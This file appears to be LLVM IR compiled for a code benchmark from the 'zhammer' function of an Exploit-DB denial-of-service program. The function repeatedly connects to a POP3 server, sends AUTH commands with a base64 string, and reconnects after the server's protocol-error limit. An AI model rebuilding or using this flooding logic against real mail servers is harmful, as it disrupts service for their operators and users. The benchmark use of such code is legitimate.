; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_3289.c_zhammer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_3289.c_zhammer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i64 }

@.str = private unnamed_addr constant [35 x i8] c"\22 d339490346794f964736669ae26e29df\00", align 1
@BBUF_SIZE = common dso_local global i32 0, align 4
@BUF_SIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [22 x i8] c"+Connecting to %s:%d.\00", align 1
@PORT_POP3 = common dso_local global i32 0, align 4
@AUTH_CMD = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [9 x i8] c"select()\00", align 1
@.str.3 = private unnamed_addr constant [44 x i8] c"(maximum number of protocol errors reached)\00", align 1
@RCNT_DELAY = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [25 x i8] c"\0A+Reconnecting to %s:%d.\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"..%d\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i8*)* @zhammer to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @zhammer(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  %15 = load i32, i32* @BBUF_SIZE, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %7, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %8, align 8
  %19 = load i32, i32* @BUF_SIZE, align 4
  %20 = zext i32 %19 to i64
  %21 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %10, align 8
  %22 = load i8*, i8** %6, align 8
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 @strlen(i8* %23)
  %25 = call i32 @base64(i8* %22, i8* %18, i32 %24)
  %26 = call i32 @strlen(i8* %18)
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %18, i64 %27
  store i8* %28, i8** %9, align 8
  %29 = load i8*, i8** %9, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %9, align 8
  store i8 13, i8* %29, align 1
  %31 = load i8*, i8** %9, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** %9, align 8
  store i8 10, i8* %31, align 1
  %33 = load i8*, i8** %9, align 8
  store i8 0, i8* %33, align 1
  %34 = load i8*, i8** %2, align 8
  %35 = load i32, i32* @PORT_POP3, align 4
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i8* %34, i32 %35)
  %37 = load i8*, i8** %2, align 8
  %38 = load i32, i32* @PORT_POP3, align 4
  %39 = call i32 @sockami(i8* %37, i32 %38)
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* %3, align 4
  %41 = sub i64 %20, 1
  %42 = trunc i64 %41 to i32
  %43 = call i32 @sock_recv(i32 %40, i8* %21, i32 %42)
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %1
  store i32 1, i32* %13, align 4
  br label %130

47:                                               ; preds = %1
  store i32 0, i32* %5, align 4
  br label %48

48:                                               ; preds = %125, %47
  %49 = load i32, i32* %5, align 4
  %50 = icmp slt i32 %49, -1
  br i1 %50, label %51, label %128

51:                                               ; preds = %48
  %52 = load i32, i32* %3, align 4
  %53 = load i8*, i8** @AUTH_CMD, align 8
  %54 = load i8*, i8** @AUTH_CMD, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = call i32 @sock_send(i32 %52, i8* %53, i32 %55)
  %57 = load i32, i32* %3, align 4
  %58 = sub i64 %20, 1
  %59 = trunc i64 %58 to i32
  %60 = call i32 @sock_recv(i32 %57, i8* %21, i32 %59)
  store i32 %60, i32* %14, align 4
  %61 = load i32, i32* %14, align 4
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %64

63:                                               ; preds = %51
  br label %128

64:                                               ; preds = %51
  %65 = load i32, i32* %3, align 4
  %66 = call i32 @strlen(i8* %18)
  %67 = call i32 @sock_send(i32 %65, i8* %18, i32 %66)
  %68 = call i32 @FD_ZERO(i32* %11)
  %69 = load i32, i32* %3, align 4
  %70 = call i32 @FD_SET(i32 %69, i32* %11)
  %71 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i32 4, i32* %71, align 8
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %72, align 8
  %73 = load i32, i32* %3, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, i32* %11, i32* null, i32* null, %struct.timeval* %12)
  store i32 %75, i32* %14, align 4
  %76 = load i32, i32* %14, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %80

78:                                               ; preds = %64
  %79 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  br label %90

80:                                               ; preds = %64
  %81 = load i32, i32* %14, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %83, label %88

83:                                               ; preds = %80
  %84 = load i32, i32* %3, align 4
  %85 = sub i64 %20, 1
  %86 = trunc i64 %85 to i32
  %87 = call i32 @sock_recv(i32 %84, i8* %21, i32 %86)
  store i32 %87, i32* %14, align 4
  br label %89

88:                                               ; preds = %80
  br label %128

89:                                               ; preds = %83
  br label %90

90:                                               ; preds = %89, %78
  %91 = call i64 @strstr(i8* %21, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0))
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %93, label %108

93:                                               ; preds = %90
  %94 = load i32, i32* %3, align 4
  %95 = call i32 @close(i32 %94)
  %96 = load i32, i32* @RCNT_DELAY, align 4
  %97 = call i32 @sleep(i32 %96)
  %98 = load i8*, i8** %2, align 8
  %99 = load i32, i32* @PORT_POP3, align 4
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0), i8* %98, i32 %99)
  %101 = load i8*, i8** %2, align 8
  %102 = load i32, i32* @PORT_POP3, align 4
  %103 = call i32 @sockami(i8* %101, i32 %102)
  store i32 %103, i32* %3, align 4
  %104 = load i32, i32* %3, align 4
  %105 = sub i64 %20, 1
  %106 = trunc i64 %105 to i32
  %107 = call i32 @sock_recv(i32 %104, i8* %21, i32 %106)
  store i32 %107, i32* %14, align 4
  br label %108

108:                                              ; preds = %93, %90
  %109 = load i32, i32* %14, align 4
  %110 = icmp slt i32 %109, 0
  br i1 %110, label %111, label %112

111:                                              ; preds = %108
  br label %128

112:                                              ; preds = %108
  %113 = load i32, i32* %5, align 4
  %114 = add nsw i32 %113, 1
  %115 = srem i32 %114, 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %121, label %117

117:                                              ; preds = %112
  %118 = load i32, i32* %5, align 4
  %119 = add nsw i32 %118, 1
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 %119)
  br label %121

121:                                              ; preds = %117, %112
  %122 = load i32, i32* @stdout, align 4
  %123 = call i32 @fflush(i32 %122)
  %124 = call i32 @usleep(i32 1000)
  br label %125

125:                                              ; preds = %121
  %126 = load i32, i32* %5, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %5, align 4
  br label %48

128:                                              ; preds = %111, %88, %63, %48
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %13, align 4
  br label %130

130:                                              ; preds = %128, %46
  %131 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %131)
  %132 = load i32, i32* %13, align 4
  switch i32 %132, label %134 [
    i32 0, label %133
    i32 1, label %133
  ]

133:                                              ; preds = %130, %130
  ret void

134:                                              ; preds = %130
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @base64(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @sock_recv(i32, i8*, i32) #2

declare dso_local i32 @sock_send(i32, i8*, i32) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i64 @strstr(i8*, i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @usleep(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
